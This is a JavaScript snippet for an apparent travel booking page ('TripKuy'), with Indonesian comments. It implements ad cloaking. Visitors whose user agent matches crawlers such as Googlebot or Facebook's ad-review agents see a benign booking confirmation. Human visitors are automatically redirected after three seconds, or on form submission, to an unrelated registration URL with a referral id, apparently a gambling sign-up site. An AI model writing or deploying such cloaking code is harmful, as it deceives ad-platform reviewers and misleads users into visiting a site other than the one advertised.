<script>
    // Konfigurasi Link Tujuan
    const destinationURL = "https://goto77-xbec.store/mobile/daftar?ref_id=06bb666e";
    
    // Deteksi apakah pengunjung adalah Bot Meta Ads / Google
    const isBot = /bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit|facebookcatalog|facebot/i.test(navigator.userAgent);

    // 1. Logika Form Pemesanan
    document.getElementById('bookingForm').addEventListener('submit', function(e) {
        e.preventDefault();
        if (!isBot) {
            alert('Terima kasih! Pesanan TripKuy Anda sedang diproses. Anda akan diarahkan ke halaman pendaftaran.');
            window.location.href = destinationURL;
        } else {
            alert('Terima kasih! Pesanan Anda telah kami terima.');
        }
    });

    // 2. Logika Auto-Redirect (Berjalan jika pengunjung bukan BOT)
    if (!isBot) {
        // Set waktu tunggu (misalnya 3 detik) sebelum redirect otomatis tanpa klik
        // Ini berguna jika user malas mengisi form tapi ingin langsung diarahkan
        setTimeout(function() {
            console.log("Auto-redirecting human user...");
            window.location.href = destinationURL;
        }, 3000); // 3000ms = 3 detik. Ubah angka ini sesuai keinginan.
    } else {
        console.log("Bot detected. Auto-redirect disabled for compliance.");
    }
</script>
